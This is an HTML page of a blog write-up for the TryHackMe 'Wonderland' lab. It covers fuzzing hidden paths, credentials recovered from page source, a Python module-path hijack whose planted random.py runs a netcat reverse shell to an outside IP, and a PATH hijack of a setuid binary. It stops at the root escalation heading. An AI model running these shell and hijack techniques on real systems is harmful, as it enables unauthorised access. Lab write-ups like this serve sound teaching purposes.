@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+        TryHackMe - Wonderland Writeup - fmash16&#39;s blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="A linux machine having a number of techniques for privesc - python path hijack, environment PATH hijack, linux file capabilities." />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>TryHackMe - Wonderland Writeup - fmash16&#39;s blog</title>
+    
+    
+    <link rel="stylesheet" href="https://fmash16.github.io/css/style.min.7da690b0190e15a7d877c45a0c70585e1afa92409e2100ebbdb0fa7ed5ffc0fb.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="TryHackMe - Wonderland Writeup" />
+<meta property="og:description" content="A linux machine having a number of techniques for privesc - python path hijack, environment PATH hijack, linux file capabilities." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" />
+<meta property="og:image" content="https://fmash16.github.io/img/tryhackme_wonderland/card.png" />
+<meta property="og:image" content="https://fmash16.github.io/" />
+<meta property="article:published_time" content="2020-06-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-08T00:00:00+00:00" />
+
+<meta itemprop="name" content="TryHackMe - Wonderland Writeup">
+<meta itemprop="description" content="A linux machine having a number of techniques for privesc - python path hijack, environment PATH hijack, linux file capabilities.">
+<meta itemprop="datePublished" content="2020-06-08T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-06-08T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="683">
+<meta itemprop="image" content="https://fmash16.github.io/img/tryhackme_wonderland/card.png">
+<meta itemprop="image" content="https://fmash16.github.io/">
+
+
+
+<meta itemprop="keywords" content="linux privesc,python path hijack,environment path hijack,linux file capabilities,ghidra,fuzzing," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fmash16.github.io/img/tryhackme_wonderland/card.png"/>
+
+<meta name="twitter:title" content="TryHackMe - Wonderland Writeup"/>
+<meta name="twitter:description" content="A linux machine having a number of techniques for privesc - python path hijack, environment PATH hijack, linux file capabilities."/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+
+   
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto&#43;Sans&#43;JP&amp;display=swap" type="text/css" media="all" /> 
+   
+
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="https://fmash16.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">8</span></li>
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">5</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="https://fmash16.github.io/tags/.net/" class="tag-list-link">.net</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/.netfiddle/" class="tag-list-link">.netfiddle</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/bludit-cms/" class="tag-list-link">bludit-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/c#/" class="tag-list-link">c#</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cewl/" class="tag-list-link">cewl</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crontab/" class="tag-list-link">crontab</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dll/" class="tag-list-link">dll</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dnspy/" class="tag-list-link">dnspy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dynamic-js/" class="tag-list-link">dynamic-js</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dynamic-xss/" class="tag-list-link">dynamic-xss</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/environment-path-hijack/" class="tag-list-link">environment-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">5</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ghidra/" class="tag-list-link">ghidra</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gila-cms/" class="tag-list-link">gila-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/injection/" class="tag-list-link">injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">3</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux-file-capabilities/" class="tag-list-link">linux-file-capabilities</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux-privesc/" class="tag-list-link">linux-privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/logrotate-race-condition/" class="tag-list-link">logrotate-race-condition</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysqldump/" class="tag-list-link">mysqldump</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">4</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/real-world/" class="tag-list-link">real-world</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/smb/" class="tag-list-link">smb</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/smbclient/" class="tag-list-link">smbclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sql/" class="tag-list-link">sql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sql-truncation-attack/" class="tag-list-link">sql-truncation-attack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/subdomain/" class="tag-list-link">subdomain</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo-privesc/" class="tag-list-link">sudo-privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/tar/" class="tag-list-link">tar</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/vb/" class="tag-list-link">vb</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/visual-basic/" class="tag-list-link">visual-basic</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wfuzz/" class="tag-list-link">wfuzz</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wildcard/" class="tag-list-link">wildcard</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/windows/" class="tag-list-link">windows</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/xss/" class="tag-list-link">xss</a><span class="tag-list-count">1</span>
+            
+        </ul>
+
+    </div>
+</div>
+
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-nest-writeup/" class="title">Hackthebox - Nest Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-05 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-05</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" class="title">TryHackMe - Wonderland Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-08 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-08</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" class="title">Hackthebox - Book Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" class="title">TryHackMe - CMesS Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-03</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/"
+    >TryHackMe - Wonderland Writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" class="article-date">
+  <time datetime="2020-06-08 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-08</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/tryhackme-writeups/"> TryHackMe writeups </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/linux-privesc/"> linux privesc </a>
+    <a class="article-tag-link" href="/tags/python-path-hijack/"> python path hijack </a>
+    <a class="article-tag-link" href="/tags/environment-path-hijack/"> environment path hijack </a>
+    <a class="article-tag-link" href="/tags/linux-file-capabilities/"> linux file capabilities </a>
+    <a class="article-tag-link" href="/tags/ghidra/"> ghidra </a>
+    <a class="article-tag-link" href="/tags/fuzzing/"> fuzzing </a>
+  </span>
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p><img src="/img/tryhackme_wonderland/card.png" alt=""></p>
+<p>As usual, we add the machine IP to our /etc/hosts file</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>10.10.226.99 wonderland.thm
+</code></pre></div><h1 id="nmap-scan">Nmap Scan</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nmap -sC -sV -sS -oN nmap.out wonderland.thm
+</code></pre></div><p>Open ports:</p>
+<ul>
+<li>22/tcp open  ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
+<li>80/tcp open  http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="http-web-page">HTTP web page</h2>
+<p>Going to port 80, we find a webpage.</p>
+<p><img src="/img/tryhackme_wonderland/1.png" alt=""></p>
+<h2 id="gobuster-fuzzing">Gobuster Fuzzing</h2>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div><p>We find the following</p>
+<p><img src="/img/tryhackme_wonderland/2.png" alt=""></p>
+<h2 id="img">/img</h2>
+<p>Under the img folder, we find 3 images</p>
+<p><img src="/img/tryhackme_wonderland/3.png" alt=""></p>
+<h2 id="r">/r</h2>
+<p>In the /r folder we find the following</p>
+<p><img src="/img/tryhackme_wonderland/4.png" alt=""></p>
+<h3 id="fuzzing-r">Fuzzing /r</h3>
+<p>We fuzz for some more contents under /r using ffuf and find a directory /a. It
+says us to continue down the rabbit hole. It seems that we have a pattern here
+&ndash;&gt; /r/a/&hellip;, so we can guess the next directories will be /b/b/i/t.
+So the path becomes /r/a/b/b/i/t. We go to the address <code>http://wonderland.thm/r/a/b/b/i/t/</code>.</p>
+<p><img src="/img/tryhackme_wonderland/5.png" alt=""></p>
+<p>Having a look at the source of the page, we find the following</p>
+<p><img src="/img/tryhackme_wonderland/6.png" alt=""></p>
+<p>Creds found :</p>
+<blockquote>
+<p>alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
+</blockquote>
+<p>We can use these creds to login to the machine using SSH.</p>
+<p><img src="/img/tryhackme_wonderland/7.png" alt=""></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="user---rabbit">User - rabbit</h2>
+<p>We check the sudo privileges of the user alice and find the following</p>
+<p><img src="/img/tryhackme_wonderland/8.png" alt=""></p>
+<p>So we can run the following as the user <code>rabbit</code></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre></div><p>We have a look at the python script</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">random</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>poem = <span style="color:#ed9d13">&#34;&#34;&#34;The sun was shining on the sea,
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#ed9d13">Shining with all his might:
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#ed9d13">He did his very best to make
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#ed9d13">............................
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#ed9d13">............................
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#ed9d13">And that was scarcely odd, because
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#ed9d13">Theyd eaten every one.&#34;&#34;&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">10</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>    line = random.choice(poem.split(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;The line was:</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">&#34;</span>, line)
+</code></pre></div><p>It import the python library &ldquo;random&rdquo;. We can use <code>python path hijack</code> here
+to escalate our privileges. The script will look for the random module in its
+working directory first. And since we have write permissions in the working
+directory, we can write a script &ldquo;random.py&rdquo; with the function <code>choice</code>
+that gets called in the script, executing a reverse shell of ours to escalte
+the privileges. So we create a file random.py in the same directory as follows</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">choice</span>(a):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span>  os.system(<span style="color:#ed9d13">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.17.253 1337&gt;/tmp/f&#34;</span>)
+</code></pre></div><p>Now we run the following as user &ldquo;rabbit&rdquo;</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre></div><p>We open up a nc listener on our host and get a shell back.</p>
+<p><img src="/img/tryhackme_wonderland/9.png" alt=""></p>
+<h2 id="user---hatter">User - hatter</h2>
+<p>Going over to /home/rabbit, we find an ELF executable binary <code>teaParty</code>.
+We copy the executable to our local machine and examinte it with ghidra. Ghidra
+decompiles the binary for us and show us the main function in C as follows:</p>
+<p><img src="/img/tryhackme_wonderland/10.png" alt=""></p>
+<p>We see that the program has setuid as user with id=1003 which is the user
+&ldquo;hatter&rdquo;.
+We also notice the command executed in the binary and find that the command
+<code>date</code> is executed without using absolute path. So we can hijack the PATH
+<code>date</code> is called from, by creating an executable named &ldquo;date&rdquo; and adding it
+to the environment PATH.</p>
+<p>So we create a file named &ldquo;date&rdquo; in a directory /tmp/path containing</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/sh
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>bash -i
+</code></pre></div><p>So, since the program is setuid, we will get an interactive bash shell as user
+hatter.We make it executable and add the directory to our Environment PATH</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>chmod <span style="color:#3677a9">777</span> /tmp/path/date
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#24909d">export</span> <span style="color:#40ffff">PATH</span>=/tmp/path:<span style="color:#40ffff">$PATH</span>
+</code></pre></div><p>Now, we execute the binary and get a shell as the user &ldquo;hatter&rdquo;</p>
+<p><img src="/img/tryhackme_wonderland/11.png" alt=""></p>
+<p>In the home directory, we find the password for user hatter.
+Creds found:</p>
+<blockquote>
+<p>hatter:WhyIsARavenLikeAWritingDesk?</p>
+</blockquote>
+<p>So, now, we can SSH into the machine as user hatter.</p>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<p>Running linpeas.sh on the target, we find the following escalation vector</p>
+<p><img src="/img/tryhackme_wonderland/11.png" alt=""></p>
